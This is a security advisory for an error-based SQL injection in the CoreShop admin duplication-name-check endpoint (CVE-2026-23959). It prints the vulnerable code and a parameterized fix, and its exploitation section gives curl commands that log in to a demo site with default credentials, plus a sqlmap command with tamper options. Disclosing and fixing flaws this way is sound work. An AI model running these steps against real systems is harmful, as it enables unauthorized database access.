# [M] CoreShop Vulnerable to SQL Injection via Admin customer-company-modifier

## Summary
Severity: Medium
Advisory: GHSA-fqcv-8859-86x2
CVE: CVE-2026-23959
CWE: CWE-564
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-fqcv-8859-86x2
Type: github-advisory

## Affected
- Packagist: `coreshop/core-shop` — affected >=0 <4.1.9

## Details
# SQL Injection in CustomerTransformerController

## Summary
An **error-based SQL Injection vulnerability** was identified in the `CustomerTransformerController` within the CoreShop admin panel.  
The affected endpoint improperly interpolates user-supplied input into a SQL query, leading to database error disclosure and potential data extraction.

This issue is classified as **MEDIUM severity**, as it allows SQL execution in an authenticated admin context.

---

## Details
The vulnerability exists in the company name duplication check endpoint:

```
/admin/coreshop/customer-company-modifier/duplication-name-check?value=
```

Source code analysis indicates that user input is directly embedded into a SQL condition without parameterization.

**Vulnerable file:**
```
/app/repos/coreshop/src/CoreShop/Bundle/CustomerBundle/Controller/CustomerTransformerController.php
```

**Vulnerable code pattern:**
```php
sprintf('name LIKE "%%%s%%"', (string) $value)
```

The `$value` parameter is fully user-controlled and is not escaped or bound as a prepared statement parameter.  
Supplying a double quote (`"`) causes a SQL syntax error, confirming that the input is executed in a SQL context.

---

## Exploitation Steps:

### Prerequisites
- Admin panel access at `https://demo4.coreshop.org/admin`
- Default credentials: `admin / coreshop`

### Authenticate to admin panel
```bash
   # Get CSRF token
   curl -s 'https://demo4.coreshop.org/admin/login/csrf-token' | grep csrfToken

   # Initialize session
   curl -s -c /tmp/session.txt 'https://demo4.coreshop.org/admin/login' > /dev/null

   # Get CSRF token with session
   CSRF=$(curl -s -b /tmp/session.txt 'https://demo4.coreshop.org/admin/login/csrf-token' | grep -o '"csrfToken":"[^"]*"' | cut -d'"' -f4)

   # Login
   curl -s -i -b /tmp/session.txt -c /tmp/session.txt \
     -X POST 'https://demo4.coreshop.org/admin/login/login' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d "username=admin&password=coreshop&csrfToken=$CSRF"
   ```

### Trigger SQL error to confirm injection
   ```bash
   curl -s -b /tmp/session.txt \
     'https://demo4.coreshop.org/admin/coreshop/customer-company-modifier/duplication-name-check?value=%22'
   ```

   **Expected result:** HTTP 500 error page with title "500 | CORS - Pimcore Digital Agency"

   **Normal response (non-error):**
   ```json
   {"success":true,"message":null,"list":[]}
   ```

### Proof of Impact:

**Test 1 - Normal query:**
```bash
GET /admin/coreshop/customer-company-modifier/duplication-name-check?value=test
Response: {"success":true,"message":null,"list":[]}
```

**Test 2 - SQL injection (error-inducing):**
```bash
GET /admin/coreshop/customer-company-modifier/duplication-name-check?value="
Response: HTTP 500 Internal Server Error
<!DOCTYPE html>
<html lang="en">
<head>
  <title>500 | CORS - Pimcore Digital Agency</title>
  ...
</head>
```
The double quote character causes a SQL syntax error, confirming the injection point. The application returns a 500 error instead of the normal JSON response, proving that unescaped user input reaches the SQL query.

**Sqlmap Result:**
```bash
python sqlmap.py -r sql.txt --random-agent --batch --force-ssl --ignore-code=403,404 --no-cast --tamper=between,randomcase,space2comment --proxy http://127.0.0.1:8080/ --dbms=mysql -p value --level=5 --risk=3 --current-db
```
<img width="1921" height="747" alt="sqlmappoc" src="https://github.com/user-attachments/assets/4069bbd4-d1a1-4ad1-9983-24402a20f985" />

---

## Impact
- **Vulnerability type:** SQL Injection (Error-based)
- **Affected users:** CoreShop / Pimcore admin users
- **Potential impact:**
  - Database error disclosure
  - Database schema enumeration
  - Possible data extraction via error-based or blind SQL injection

---

## Recommended Fix

### 1. Use Parameterized Queries (Required)
Avoid building SQL conditions using string concatenation or `sprintf`.  
Use Doctrine QueryBuilder parameters instead.

**❌ Vulnerable example:**
```php
$condition = sprintf('name LIKE "%%%s%%"', (string) $value);
```

**✅ Secure example (Doctrine QueryBuilder):**
```php
$qb->andWhere('c.name LIKE :name')
   ->setParameter('name', '%' . $value . '%');
```

This ensures proper escaping and prevents SQL injection.

---

### 2. Validate User Input (Defense-in-Depth)
Apply strict input validation before processing user data:

```php
if (!is_string($value) || mb_strlen($value) > 255) {
    throw new BadRequestHttpException('Invalid input');
}
```

Optionally, restrict allowed characters if business logic permits.

---

### 3. Handle Errors Gracefully
Avoid returning raw 500 error pages to users.  
Catch database exceptions and return a controlled JSON error response instead:

```php
return new JsonResponse([
    'success' => false,
    'message' => 'Invalid request'
], 400);
```

---

### 4. Security Best Practice
- Never interpolate user input directly into SQL strings
- Always use prepared statements or ORM parameter binding
- Ensure consistent input validation on all admin endpoints

---

## References
- https://github.com/coreshop/CoreShop/security/advisories/GHSA-fqcv-8859-86x2
- https://nvd.nist.gov/vuln/detail/CVE-2026-23959
- https://github.com/coreshop/CoreShop/commit/af80b8f5c7df5f02f44e9c5e0a4a564de274eec2
- https://github.com/coreshop/CoreShop
- https://github.com/coreshop/CoreShop/releases/tag/4.1.9
